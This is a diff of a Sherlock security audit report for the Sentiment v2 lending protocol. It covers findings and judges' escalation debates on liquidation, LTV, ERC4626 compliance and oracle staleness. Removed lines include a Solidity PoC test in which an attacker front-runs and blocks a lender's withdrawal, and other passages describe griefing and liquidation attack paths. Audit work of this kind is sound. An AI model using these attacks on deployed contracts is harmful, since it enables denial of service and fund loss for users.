-Additionally, imaginary borrow debt will prevent borrowers from being able to withdraw their own funds, even though all their debt was fairly repaid. Since the position's collateral cannot be withdrawn due to these imaginary outstanding borrow shares, this permits the malicious liquidator to repeatedly liquidate the position.
-
-We can also anticipate that this debt would grow quite quickly, since the PoC demonstrates that after repaying all debt, the malicious liquidator can force the position into retaining `490000000000000000` / `500000000000000000` (98%) of the original borrow obligation.
-
-## Code Snippet
-
-```solidity
-/// @notice Liquidate an unhealthy position
-/// @param position Position address
-/// @param debtData DebtData object for debts to be repaid
-/// @param assetData AssetData object for assets to be seized
-function liquidate(
-    address position,
-    DebtData[] calldata debtData,
-    AssetData[] calldata assetData
-) external nonReentrant {
-    riskEngine.validateLiquidation(position, debtData, assetData);
-
-    // liquidate
-    _transferAssetsToLiquidator(position, assetData);
-    _repayPositionDebt(position, debtData);
-
-    // position should be within risk thresholds after liquidation
-    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
-    emit Liquidation(position, msg.sender, ownerOf[position]);
-}
-```
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L426C5-L444C6
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-Do not permit liquidators the flexibility to control the number of borrow shares burned, instead, compute these as a function of the assets taken from the position.
-
-# Issue M-5: Liquidation fee is incorrectly calculated, leading to unprofitable liquidations 
+# Issue M-2: Liquidation fee is incorrectly calculated, leading to unprofitable liquidations 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/91 
 
@@ -777,7 +916,15 @@ _No response_
 
 Consider calculating the profit of the liquidation first, and take the fee based on that
 
-# Issue M-6: Griefer can DOS the `SuperPool` creation and make it very expensive for other users 
+
+
+## Discussion
+
+**0xjuaan**
+
+Hi @cvetanovv I forgot to escalate this (hard to keep track of so many), but I think everyone would agree this is high severity
+
+# Issue M-3: Griefer can DOS the `SuperPool` creation and make it very expensive for other users 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/97 
 
@@ -944,12 +1091,93 @@ Don't require from the user to deposit and actually mint the dead shares. You ca
 1. The `totalAssets` function to return the actual total assets + 1000
 2. The `totalSupply` function to return the actual total supply + 1000
 
-# Issue M-7: LTV of 98% would be extremely dangerous 
+
+
+## Discussion
+
+**samuraii77**
+
+The pool creator can simply redeploy the pool, this is not an issue of significance. Furthermore, that exact pool can be created as the nonce increases even upon a transaction reverting (source: https://ethereum.stackexchange.com/a/77049), thus a different address will be generated.
+
+**AtanasDimulski**
+
+Escalate,
+Per above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/97#issuecomment-2352108563)
+
+
+**sherlock-admin3**
+
+> Escalate,
+> Per above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/97#issuecomment-2352108563)
+> 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Kalogerone**
+
+> The pool creator can simply redeploy the pool, this is not an issue of significance. Furthermore, that exact pool can be created as the nonce increases even upon a transaction reverting (source: https://ethereum.stackexchange.com/a/77049), thus a different address will be generated.
+
+Still doesn't change the fact that a user can frontrun the `deploySuperPool` transactions by donating a small amount of the token to the future address and DOS all the pool creation attempts.
+
+**cvetanovv**
+
+I agree with @Kalogerone comment. Even if the pool creator redeploys the pool, the malicious user can DoS also the new pool.
+
+Planning to reject the escalation and leave the issue as is.
+
+**Evert0x**
+
+Result:
+Medium
+Has Duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [AtanasDimulski](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/97/#issuecomment-2352298678): rejected
+
+**10xhash**
+
+@cvetanovv Sorry for the late reply
+
+Sherlock has clear rules on DOS issues that can be considered valid:
+
+```
+Could Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue? DoS has two separate scores on which it can become an issue:
+
+    The issue causes locking of funds for users for more than a week.
+    The issue impacts the availability of time-sensitive functions (cutoff functions are not considered time-sensitive). If at least one of these are describing the case, the issue can be a Medium. If both apply, the issue can be considered of High severity. Additional constraints related to the issue may decrease its severity accordingly.
+    Griefing for gas (frontrunning a transaction to fail, even if can be done perpetually) is considered a DoS of a single block, hence only if the function is clearly time-sensitive, it can be a Medium severity issue.
+```
+
+Both of this is not the case here. Similar is the case for https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/400
+
+**Kalogerone**
+
+> V. How to identify a medium issue:
+> 1. Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.
+> 2. Breaks core contract functionality, rendering the contract useless or leading to loss of funds.
+
+It's pretty self explanatory that this issue "Breaks core contract functionality, rendering the contract useless". I don't think it is appropriate to play with the words here and try to invalidate an issue that denies the ability to create a pool in a protocol based on user created pools.
+
+**cvetanovv**
+
+With this attack that requires minimal funds, the malicious user breaks the contract and enters the category:
+
+> Breaks core contract functionality, rendering the contract useless or leading to loss of funds.
+
+# Issue M-4: LTV of 98% would be extremely dangerous 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/102 
 
 ## Found by 
-X12
+000000, A2-security, Nihavent, Obsidian, X12, ZeroTrust
 ## Summary
 Having an LTV of 98% that pools can set is really dangerous as it doesn't take into account that oracle prices have the so called deviation, which can be anywhere from 0.25% to 2%. Meaning that the actual LTV would be `LTV + oracle1 deviation + oracle2 deviation`, which can result in `> 100% LTV`.
 
@@ -1007,80 +1235,143 @@ Manual Review
 ## Recommendation
 Have a lower max LTV.
 
-# Issue M-8: Improper handling of price normalization to `e18` in `RedstoneOracle.sol#getValueInEth` 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/103 
-
-## Found by 
-Anirruth, MVKsentry
-### Summary
-
-The RedstoneOracle#getValueInEth returns price of `ASSSETe18` mutiplied by `(ASSET/USD) / (ETH/USD)`which are gotten from Redstone Oracles and not scaled to 18 decimals as the `ASSET`.
-
-The problem is that Redstone Oracles are 8 decimals by default which can be seen here [Redstone price feeds decimals](https://github.com/redstone-finance/redstone-oracles-monorepo/blob/9d10a48aad7a2ccb5f3f48396d970fd63761dbce/packages/on-chain-relayer/contracts/price-feeds/PriceFeedBase.sol#L51-L53)
-
-### Root Cause
-
-The issue itself lies in the normalization to `e18` of the returned by the method price.
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/oracle/RedstoneOracle.sol#L67-L71
-
-### Internal pre-conditions
-
-_No response_
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-_No response_
-
-### Impact
-
-Financial losses due to inaccuracy in the math.
-
-### PoC
-
-As per openzeppelin math [mulDiv function parameters](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/0b58a783b9b33b63eef2994af8958c0c6a72dc51/contracts/utils/math/Math.sol#L144)
-x = amt: Scaled to 18 decimals.
-y = assetUsdPrice: 8 decimals.
-denominator = ethUsdPrice: 8 decimals.
-
-The calculation performed by the `getValueInEth` function is:
-```math
-
-\text{Result} = \frac{\text{amt} \times \text{assetUsdPrice}}{\text{ethUsdPrice}}
-```
-
-Substituting the values:
-```math
-\text{Result} = \frac{(1 \times 10^{18}) \times (1 \times 10^{8})}{2 \times 10^{8}}
-```
-
-Simplifying the expression:
-```math
-\text{Result} = \frac{1 \times 10^{26}}{2 \times 10^{8}} = \frac{1 \times 10^{26}}{2 \times 10^{8}} = 0.5 \times 10^{18} = 5 \times 10^{17}
-```
-Thus, the function will return:
-```math
-`\boxed{5 \times 10^{17}}
-```
-
-### Mitigation
-
-Consider normalizing the prices of `assetUsdPrice, ethUsdPrice` to `1e18` OR the `asset` price to `1e8` and after that the calculation outcome value to `1e18`
 
 
-# Issue M-9: The `SuperPool` vault is not strictly ERC4626 compliant as it should be 
+## Discussion
+
+**iamnmt**
+
+Escalate
+
+Invalid.
+
+The pool owner can always set the LTV in range of `[minLtv, maxLtv]`. The pool owner is trusted to set the LTV to a correct value that not cause any problems.
+
+Per the Sherlock rules:
+
+> 5. (External) Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.
+> If no values are provided, the (external) admin is trusted to use values that will not cause any issues.
+
+The contest `README` is only specifying the value for `Max LTV`, but it does not specify any value for the LTV of a pool.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Invalid.
+> 
+> The pool owner can always set the LTV in range of `[minLtv, maxLtv]`. The pool owner is trusted to set the LTV to a correct value that not cause any problems.
+> 
+> Per the Sherlock rules:
+> 
+> > 5. (External) Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.
+> > If no values are provided, the (external) admin is trusted to use values that will not cause any issues.
+> 
+> The contest `README` is only specifying the value for `Max LTV`, but it does not specify any value for the LTV of a pool.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**0x3b33**
+
+Since a range with valid LTV rations is provided everything in this range will be used for different pools. The issue shows how this range is flawed, if pool owner are not supposed to use the values in the rage what is the purpose of having it.
+
+The [docs](https://docs.sherlock.xyz/audits/judging/judging) clearly state the the README defines  custom `restrictions`, which were proven wrong in the issue above.
+> The protocol team can use the README (and only the README) to define language that indicates the codebase's restrictions and/or expected functionality.
+
+The issue clearly describes a flaw in the system, while your escalation doesn't justify why it should be invalid. Just twisting the rules around won't be sufficient to invalidate issues.
+
+**cvetanovv**
+
+I disagree with escalation.
+
+@0x3b33 Explain very well how setting a Loan-to-Value (LTV) ratio of 98% is significant because it brings the system dangerously close to a situation where the collateral provided by borrowers could be insufficient to cover the borrowed amount, leading to potential losses for lenders and instability in the protocol.
+
+Also, #122 will be duplicated with this issue. You can see this comment: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/122#issuecomment-2377459586
+
+Planning to reject the escalation and leave the issue as is.
+
+**iamnmt**
+
+@cvetanovv 
+
+Why is the quoted rule not applicable in this case?
+
+I want to elaborate on the escalation. There are two actors in this issue:
+- The protocol, who set the `Min LTV`, and `Max LTV`
+- The pool owner, who set the LTV of their pool in the range of `[Min LTV, Max LTV]`
+
+The pool owner will not blindly set any LTV to their asset. Let's say there is a high-volatility asset, then setting the LTV to a high value (e.g. 90%) that is not the Max LTV will cause problems, so the pool owner is expected to set a lower LTV to these assets. In this case, the pool owner is expected to carefully examine the price deviation and set the LTV according to that. Why the same reasoning can not be applied to this issue? The pool owner has to examine the two oracle deviations and set the LTV to not cause any problems.
+
+If this issue is valid, then should an issue about setting a high LTV to a high-volatility asset cause problems to be valid?
+
+
+
+**0x3b33**
+
+Why then we have TVL limit caps and not let them be settable to any value ?
+
+
+ I am not saying the owner is not trusted. What I am saying is since that value is provided in a range and this is one of the possible ranges (98%) then it is expected to be used for some pools, however it's use will be extremely dangerous (the why is explained above). Because of that this core feature (the TVL range) is wrong and it's liquidation threshold is too close to bad debt, that even 1 small even can flip a healthy position into a bad debt one.
+
+**cvetanovv**
+
+I agree with @0x3b33  comment.
+
+Because of such situations, this question has been added to the Readme to make it clear what values the protocol will use:
+
+https://github.com/sherlock-audit/2024-08-sentiment-v2?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths
+
+_Are there any limitations on values set by admins (or other roles) in the codebase, including restrictions on array lengths?_
+> Expected launch values for protocol params: Min LTV = 10% = 100000000000000000 Max LTV = 98% = 980000000000000000
+
+We currently have issues with the value provided by the protocol(**98**%). That's exactly the reason this question is being asked on the protocol. To know the TRUSTED Аdmin, what values will be used. That is why this issue is valid.
+
+My decision to reject the escalation remains.
+
+**WangSecurity**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [iamnmt](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/102/#issuecomment-2351862536): rejected
+
+**10xhash**
+
+@cvetanovv Sorry for the late reply
+
+> We currently have issues with the value provided by the protocol(98%). That's exactly the reason this question is being asked on the protocol. To know the TRUSTED Аdmin, what values will be used
+
+As per the earlier escalation comment, a pool owner can set any value b/w 10% and 98%. LTV is a risk parameter. If they are choosing to set LTV to 98% it is their chosen risk for the pool and lender's who are not comfortable with the risk are not required to deposit into it. 
+And it is not required for all configurations to even have issues when the LTV is set to 98%. There are fixed price oracles being used which will have no issues even with setting LTV to 98%. So an admin is trusted to use this value only when such problems won't arise
+
+**cvetanovv**
+
+@10xhash, thanks for the comment.
+
+My decision is based on the admin trust assumptions rule: 
+
+> Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.
+
+If there were no values specified in the Readme, this issue would be invalid. However, since a trusted admin would use an LTV of 98%, I think this issue is valid.
+
+# Issue M-5: The `SuperPool` vault is not strictly ERC4626 compliant as it should be 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110 
 
 The protocol has acknowledged this issue.
 
 ## Found by 
-0xAadi, 4gontuk, EgisSecurity, Kalogerone, Obsidian, Ryonen, hash, iamandreiski
+000000, 0xAadi, 4gontuk, A2-security, Atharv, EgisSecurity, Flare, Kalogerone, Nihavent, Obsidian, Ryonen, S3v3ru5, dany.armstrong90, h2134, hash, iamandreiski, pseudoArtist, xtesias
 ### Summary
 
 The contest [README](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/README.md?plain=1#L49) file clearly states that:
@@ -1159,25 +1450,171 @@ Don't calculate any new fees accrued in the `external convertTo` functions:
     }
 ```
 
-# Issue M-10: An attacker can permanently DOS lender from withdrawing by a sandwich attack 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/127 
+
+
+## Discussion
+
+**neko-nyaa**
+
+Escalate
+
+Within this issue family, there are several issues having to do with the inclusion of fees, while others deal with the pool's (lack of) liquidity. Some of the issues has to be moved over to #129 which deals with liquidity, or the other family has to be duped against this one.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Within this issue family, there are several issues having to do with the inclusion of fees, while others deal with the pool's (lack of) liquidity. Some of the issues has to be moved over to #129 which deals with liquidity, or the other family has to be duped against this one.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**10xhash**
+
+Issues https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/246 and https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/129, also mentions not following ERC4626 spec. Either every breaking of the spec should be grouped under one single issue, or each breaking should be considered as a different issue for consistency. But this is not followed here as highlighted in the above comment
+
+**Nihavent**
+
+Escalate
+
+The subset of this family relating to fees taken should be invalid.
+
+`convertToShares` & `convertToAssets` must simulateAccrue to update state before performing a conversion. The **only** fees included are calculated on <u>prior</u> interest earned which has nothing to do with the current conversion. They're required to be included to ensure the total shares represents an accurate state of the contract.
+
+Removing the fees since the last state update will remove some fees but not all previous fees. Any change made to remove the fees since last update would make these functions useless to end users or external protocols as they would perform calculations on invalid states. 
+
+Therefore the 'fix' here would introduce a bug.  Or you could completely redesign the contract to separate fee shares and implement useless versions of the 'convertTo...' functions for the sake of absolute ERC4626 compliance, neither of which are helpful to the protocol.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> The subset of this family relating to fees taken should be invalid.
+> 
+> `convertToShares` & `convertToAssets` must simulateAccrue to update state before performing a conversion. The **only** fees included are calculated on <u>prior</u> interest earned which has nothing to do with the current conversion. They're required to be included to ensure the total shares represents an accurate state of the contract.
+> 
+> Removing the fees since the last state update will remove some fees but not all previous fees. Any change made to remove the fees since last update would make these functions useless to end users or external protocols as they would perform calculations on invalid states. 
+> 
+> Therefore the 'fix' here would introduce a bug.  Or you could completely redesign the contract to separate fee shares and implement useless versions of the 'convertTo...' functions for the sake of absolute ERC4626 compliance, neither of which are helpful to the protocol.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**jsmi0703**
+
+@10xhash 
+> Either every breaking of the spec should be grouped under one single issue, or each breaking should be considered as a different issue for consistency.
+
+If you think so, why did you submit #567 and #568 respectively while not submit them in one report. I think that the reports which have different root cause in the code base can't be grouped into a single family.
+
+**cvetanovv**
+
+I agree with the escalation of @neko-nyaa  all issues related to ERC4626 compliant to be duplicated together. This will be the main issue.
+
+Planning to accept the escalation and duplicate this issue with #129, #500, #465 and #246 and its duplicates.
+
+**jsmi0703**
+
+I disagree the escalation. Sherlock has rule for duplication. 
+
+> 1. Identify the root cause
+
+So, we have to group only reports which have the same root cause. Moreover,
+
+> Root cause groupings
+> 
+> If the following issues appear in multiple places, even in different contracts. In that case, they may be considered to have the same root cause.
+> 
+> 1. Issues with the same logic mistake.
+> Example: uint256 is cast to uint128 unsafely.
+> 
+> 2. Issues with the same conceptual mistake.
+> Example: different untrusted external admins can steal funds.
+> 
+> 3. Issues in the category
+> Slippage protection
+> Reentrancy
+> Access control
+> Front-run / sandwich ( issue A that identifies a front-run and issue B that identifies a sandwich can be duplicated )
+> 
+> The exception to this would be if underlying code implementations OR impact OR the fixes are different, then they may be treated separately.
+
+There are no item for ERC4626 at all. Therefore, ERC4626 compliant can't be the root cause  for grouping. "ERC4626 compliant" is impact not root cause.
+#110, #129, #246 should not be grouped in one family because they have different root causes.
+
+**debugging3**
+
+I agree on the above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110#issuecomment-2362666198).As I know, they are going to be grouped by conceptual mistake rule. But the rule depends on the context. Otherwise, auditors will not submit all the vulnerabilities they found. 
+
+For instance, assume that an auditor found two issues: first one for `convertToShares()` and second one for `maxWithdraw()`. If they should be grouped in one issue, the auditor has no need of submitting the second issue and he will not submit it. Then how can the protocol team aware of the vulnerability inside the `maxWithdraw()` and fix it? 
+
+The protocol team already know that the pool should comply with ERC4626. The things they don't know are detailed vulnerabilities, not the broken "ERC4626 compliant" itself. So, I believe that the issues should be categorized into several issues according to their root cause in the code base. 
+
+**cvetanovv**
+
+My decision is to group all ERC4626 related issues together.
+
+I duplicate them by the rule of the **same conceptual mistake**.
+
+I will give an example of how all ERC4626-related issues can be duplicated by showing an example from a previous contest. Here, all Weird Tokens are duplicated together by the same conceptual mistake rule: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/545#issuecomment-2284566316
+
+Planning to reject both escalations but duplicate this issue with #129, #500, #465, and #246(and its duplicates).
+
+**Nihavent**
+
+Hi I'm wondering if this https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110#issuecomment-2359253906 escalation was considered?
+
+**cvetanovv**
+
+All will remain duplicated together. 
+
+The Readme states that the protocol wants to strictly follow the ERC4626 standard. And the Watsons have correctly pointed out what is not followed. The protocol is not required to fix their issues.
+
+My decision is to reject both escalations but duplicate this issue with #129, #500, #465, and #246(and its duplicates).
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [neko-nyaa](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110/#issuecomment-2352796671): rejected
+- [Nihavent](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/110/#issuecomment-2359253906): rejected
+
+# Issue M-6: The RedstoneCoreOracle has a constant stale price threshold, this is dangerous to use with tokens that have a smaller threshold as the oracle will report stale prices as valid 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/126 
 
 The protocol has acknowledged this issue.
 
 ## Found by 
-Obsidian
+000000, AlexCzm, Obsidian, eeshenggoh
 ### Summary
 
-If a user borrows and repays a loan within the same block they do not pay any interest
+Different tokens have different `STALE_PRICE_THRESHOLD`. The protocol uses a constant `STALE_PRICE_THRESHOLD = 3600` for all tokens in the RedstoneCoreOracle. 
 
-Therefore an attacker can sandwich a lender trying to withdraw funds by borrowing those funds, to ensure the lender's tx reverts and then backrunning the lender's withdraw tx by repaying those funds, all within the same block to ensure 0 interest.
+The issue arises when the token actually has a STALE_PRICE_THRESHOLD < 3600, then the oracle will report the stale price as valid. 
+
+Here are some tokens whose redstone priceFeed has a STALE_PRICE_THRESHOLD < 3600 (1 hour)
+
+1. TRX/USD 10 minutes
+2. BNB/USD 1 minute
 
 ### Root Cause
 
-No intra-block interest accumulation
-
-Allowing intrablock borrow and repays
+using a [constant](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L19) `STALE_PRICE_THRESHOLD = 3600`, rather than setting one for each token
 
 ### Internal pre-conditions
 
@@ -1185,240 +1622,301 @@ _No response_
 
 ### External pre-conditions
 
-_No response_
+Token has a threshold < 3600
 
 ### Attack Path
 
-1. Lender sends a tx to [withdraw](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L339) funds
-2. Frontrun (1) by depositing collateral and then borrowing an amount of assets to make (1) revert
-3. Backrun the reverted Tx by repaying the loan all within the same block to ensure no interest accumulates
+_No response_
 
 ### Impact
 
-Attacker can permanently DOS a lender withdrawing their funds, the cost of the attack is only the gas cost of the tx
+The protocol will report stale prices as valid, this results in collateral being valued using stale prices.
+
+It will lead to unfair liqudiations due to stale price valuation of collateral AND/OR a position not being liquidated due to stale price valuation of collateral
+
+It will also lead to borrowing a wrong amount due to stale price valuation of collateral
 
 ### PoC
 
-Add the following to `BigTest.t.sol`
-
-```solidity
-function test__BorrowerFrontRunsLenderWithdrawal() public {
-    uint256 depositAmount = 100 ether;
-    uint256 borrowAmount = 100 ether;
-
-    // Lender deposits
-    vm.startPrank(lender);
-    asset1.mint(lender, depositAmount);
-    asset1.approve(address(pool), depositAmount);
-    pool.deposit(linearRatePool, depositAmount, lender);
-    vm.stopPrank();
-
-    // Attacker setup
-    vm.startPrank(user);
-    (address position, Action memory newPositionAction) = newPosition(user, "test-position");
-    positionManager.process(position, newPositionAction);
-
-    // Simulate front-running: 
-    // Attacker deposits collateral
-    // Attacker borrows all available funds
-    asset2.mint(user, 200 ether);
-    asset2.approve(address(positionManager), 200 ether);
-    Action[] memory setupActions = new Action[](2);
-    setupActions[0] = addToken(address(asset2));
-    setupActions[1] = deposit(address(asset2), 200 ether);
-    positionManager.processBatch(position, setupActions);
-
-    Action memory borrowAction = borrow(linearRatePool, borrowAmount);
-    positionManager.process(position, borrowAction);
-    vm.stopPrank();
-
-    // Lender attempts to withdraw, which will revert
-    vm.prank(lender);
-    vm.expectRevert(abi.encodeWithSelector(Pool.Pool_InsufficientWithdrawLiquidity.selector, linearRatePool, 0, depositAmount));
-    pool.withdraw(linearRatePool, depositAmount, lender, lender);
-
-    // Attacker repays the full amount, without paying any interest
-    vm.startPrank(user);
-    asset1.approve(address(positionManager), borrowAmount);
-    Action memory repayAction = Action({
-        op: Operation.Repay,
-        data: abi.encode(linearRatePool, borrowAmount)
-    });
-    positionManager.process(position, repayAction);
-    vm.stopPrank();
-```
-
-Console output:
-
-```bash
-Ran 1 test for test/integration/BigTest.t.sol:BigTest
-[PASS] test__BorrowerFrontRunsLenderWithdrawal() (gas: 783412)
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.61ms (815.19µs CPU time)
-
-Ran 1 test suite in 5.94ms (4.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
-```
+_No response_
 
 ### Mitigation
 
-1. Implement intra-block interest accumulation to make this expensive for the attacker
-2. Implement a time interval between deposits and repays
+Set a unique `STALE_PRICE_THRESHOLD` for each token, similar to the chainlink oracle
 
-# Issue M-11: SuperPool doesn't strictly comply with ERC-4626. 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/129 
 
-## Found by 
-S3v3ru5, dany.armstrong90
-## Summary
-`SuperPool.maxWithdraw()` and `SuperPool.maxRedeem()` functions returns incorrect values.
-This means `SuperPool` doesn't strictly comply with ERC-4626.
+## Discussion
 
-## Vulnerability Detail
-`SuperPool.maxWithdraw()` and `SuperPool.maxRedeem()` functions calls the following `_maxWithdraw()` function.
-```solidity
-    function _maxWithdraw(address _owner, uint256 _totalAssets, uint256 _totalShares) internal view returns (uint256) {
-        uint256 totalLiquidity; // max assets that can be withdrawn based on superpool and underlying pool liquidity
-        uint256 depositQueueLength = depositQueue.length;
-        for (uint256 i; i < depositQueueLength; ++i) {
-478:        totalLiquidity += POOL.getLiquidityOf(depositQueue[i]);
-        }
-        totalLiquidity += ASSET.balanceOf(address(this)); // unallocated assets in the superpool
+**sherlock-admin2**
 
-        // return the minimum of totalLiquidity and _owner balance
-483:    uint256 userAssets = _convertToAssets(ERC20.balanceOf(_owner), _totalAssets, _totalShares, Math.Rounding.Down);
-484:    return totalLiquidity > userAssets ? userAssets : totalLiquidity;
-    }
-```
-As can be seen, the above function use liquidity of pool as withdrawable maximum assets in `L478`.
+1 comment(s) were left on this issue during the judging contest.
 
-On the other hand, `SuperPool.withdraw()` and `SuperPool.redeem()` function calls `_withdraw()` function and `_withdraw()` function calls in turn the following `_withdrawFromPools()` function to withdraw assets from deposited pools.
-```solidity
-548:function _withdrawFromPools(uint256 assets) internal {
-        uint256 assetsInSuperpool = ASSET.balanceOf(address(this));
+**z3s** commented:
+> Each asset has their own instance of a RedstoneOracle, so this param can be changed
 
-        if (assetsInSuperpool >= assets) return;
-        else assets -= assetsInSuperpool;
 
-        uint256 withdrawQueueLength = withdrawQueue.length;
-        for (uint256 i; i < withdrawQueueLength; ++i) {
-            uint256 poolId = withdrawQueue[i];
-            // withdrawAmt -> max assets that can be withdrawn from the underlying pool
-            // optimistically try to withdraw all assets from this pool
-            uint256 withdrawAmt = assets;
 
-            // withdrawAmt cannot be greater than the assets deposited by the pool in the underlying pool
-            uint256 assetsInPool = POOL.getAssetsOf(poolId, address(this));
-563:        if (assetsInPool < withdrawAmt) withdrawAmt = assetsInPool;
+**0xspearmint1**
 
-            // withdrawAmt cannot be greater than the underlying pool liquidity
-            uint256 poolLiquidity = POOL.getLiquidityOf(poolId);
-567:        if (poolLiquidity < withdrawAmt) withdrawAmt = poolLiquidity;
+escalate
 
-            if (withdrawAmt > 0) {
-                try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {
-                    assets -= withdrawAmt;
-                } catch { }
-            }
+The lead judge states that since each asset has it's own instance of the oracle the param can be changed
 
-            if (assets == 0) return;
-        }
+1. Firstly, the STALE_PRICE_THRESHOLD is a constant variable that is already set, there is no evidence that the team intended to change the currently set constant variable.
 
-        // We explicitly check assets == 0, and if so return, otherwise we revert directly here
-        revert SuperPool_NotEnoughLiquidity(address(this));
-    }
-```
-As can be seen, the above function use minimum of `assetsInPool` and `poolLiquidity` as withdrawable maximum assets (`L563` and `L567`) which is less than the value of `_maxWithdraw()` function.
+2. Secondly, since each oracles instance uses 2 price feeds to determine the USD price of the asset (Asset/ETH and ETH/USD), as long as the asset has a different threshold to ETH the described issue in the report will occur.
 
-PoC:
-1. `pool1` has `100` total deposited shares, `1000` total deposited assets and `500` total borrowed assets. So `pool1` has `1000 - 500` liquidity.
-2. `pool2` has `100` total deposited shares, `1000` total deposited assets and `1000` total borrowed assets. So `pool2` has `1000 - 1000 = 0` liquidity.
-3. `SuperPool` has `10` shares in the `pool1` and `10` shares in the `pool2`.
-4. `SuperPool` has `100` total supply(total shares) and a user has `100` shares in `SuperPool` which means that the user has `100%` shares of `SuperPool`.
-5. Therefore the user and `SuperPool` has `10 * 1000 / 100 + 10 * 1000 / 100 = 200` total assets in the underlying pools which is equal to `userAssets` of `L483` and `assets` of `L548`.
-6. `totalLiquidity` of `L484` is `0 + 500 = 500` and `_maxWithdraw()` returns `min(200, 500) = 200`.
-7. `withdrawAmt` of `L567` is `min(500, 100) = 100` for `pool1` and `min(0, 100) = 0` for `pool2`. Therefore `_withdrawFromPools()` function withdraw totally `100` assets from underlying pools which is smaller than `200` of `_maxWithdraw()` function.
+**sherlock-admin3**
 
-## Impact
-The `README.md#L161` stated as follows.
-```md
-SuperPool.sol is strictly ERC4626 compliant
-```
-However SuperPool doesn't strictly comply with ERC-4626.
+> escalate
+> 
+> The lead judge states that since each asset has it's own instance of the oracle the param can be changed
+> 
+> 1. Firstly, the STALE_PRICE_THRESHOLD is a constant variable that is already set, there is no evidence that the team intended to change the currently set constant variable.
+> 
+> 2. Secondly, since each oracles instance uses 2 price feeds to determine the USD price of the asset (Asset/ETH and ETH/USD), as long as the asset has a different threshold to ETH the described issue in the report will occur.
 
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L478
+You've created a valid escalation!
 
-## Tool used
+To remove the escalation from consideration: Delete your comment.
 
-Manual Review
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-## Recommendation
-Modify `SuperPool._maxWithdraw()` function as follows.
-```solidity
-    function _maxWithdraw(address _owner, uint256 _totalAssets, uint256 _totalShares) internal view returns (uint256) {
-        uint256 totalLiquidity; // max assets that can be withdrawn based on superpool and underlying pool liquidity
-        uint256 depositQueueLength = depositQueue.length;
-        for (uint256 i; i < depositQueueLength; ++i) {
---          totalLiquidity += POOL.getLiquidityOf(depositQueue[i]);
